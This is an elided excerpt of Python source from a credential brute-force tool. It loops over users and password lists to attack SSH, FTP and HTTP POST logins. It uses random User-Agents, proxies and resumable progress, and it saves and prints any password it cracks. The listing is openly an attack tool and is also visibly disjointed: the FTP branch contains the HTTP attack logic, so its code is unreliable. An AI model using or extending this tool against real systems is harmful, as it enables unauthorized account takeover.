...
def signal_handler(signal_received, frame):
    global should_stop
    should_stop = True
    print("\n", current_timestamp(), f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} ATTACK STOPPED. Progress saved.")
...
def parse_arguments():
    ...
    parser.add_argument('--verbose', action='store_true', help="Enable verbose output for detailed attack logs.")
    parser.add_argument('--random-agent', action='store_true', help="Use random User-Agent strings for HTTP attacks.")
    ...
    if args.user and args.users:
        ...
        # Handle --users as a file containing usernames
    if args.users:
        try:
...
if __name__ == '__main__':
    try:
        ...
        iterations = args.iterations
        time.sleep(0.1)  # Reduce initial delay for faster startup
        ...
        if isinstance(port, int):
            ...
            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Port: {Fore.YELLOW}{port}{Fore.RESET}")
        ...
        # Handle both -u (single user) and --users (file with users)
        if args.user:
            users = [args.user]  # Single user case
        else:
            users = args.users   # File-based users case

        # Load state if --resume is set
        if args.resume:
        ...
        password_chunk_size = 5  # Increase chunk size to test more passwords per iteration
        ...
        for i in range(0, len(passwords), password_chunk_size):
            for idx, user in enumerate(users):
                ...
                # If there is only one user, don't print unnecessary user switching messages
                if len(users) > 1:
                ...
                if 'ssh' in service and not ssh_auth_type_checked:
                    ...
                    time.sleep(0.2)  # Reduce delay for faster SSH check
                ...
                for j in range(min(iterations, len(passwords) - i)):
                    ...
                    if 'ssh' in service:
                        ...
                        # Reduce time between SSH connection attempts
                        if handle_timeout(ssh_attack, args.ip, port, user, password, proxy_ip, proxy_port):
                            ...
                            users.remove(user)  # Remove the user after successful attempt or after processing
                            break
                    elif 'ftp' in service:
                        ...
                        if not args.http_post:
                            raise ValueError(f"{Fore.WHITE}[{Fore.YELLOW}ERROR{Fore.WHITE}]{Fore.RESET}{Fore.RED} HTTP POST parameters must be specified for HTTP attack.")
                        if not (args.failure_content_length or args.success_content_length or args.success_pattern or args.failure_pattern):
                            raise ValueError(f"{Fore.WHITE}[{Fore.YELLOW}ERROR{Fore.WHITE}]{Fore.RESET}{Fore.RED} At least one response parameter must be specified for HTTP service.")
                        ...
                        result = http_attack(args.ip, user, password, http_post_params=args.http_post,
                                             ...
                                             failure_content_length=args.failure_content_length, proxy_ip=None,
                                             proxy_port=None)

                        if result is True:
                            save_to_file(args.ip, args.service, user, password, attempt_count)
                            users.remove(user)  # Remove the user after successful attempt or after processing
                            print(current_timestamp(), f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.GREEN} Password found for [*]{user}[*] in [{time_elapsed:.2f} seconds] with [{attempt_count} tries]. PASS = {Fore.BLUE}{password}")
                            break
                        else:
                            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Failed attempt for user {Fore.YELLOW}{user}{Fore.RESET} with pass: {Fore.YELLOW}{password}")
                            time.sleep(0.1)  # Reduced sleep for faster retries

                    # Save progress after each password chunk (without printing "Progress saved successfully")
                    save_progress(attempt_count, user, password, users[idx:], passwords[i + j + 1:])

            first_iteration = False

        print(current_timestamp(), f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.BLUE} Attack complete.")
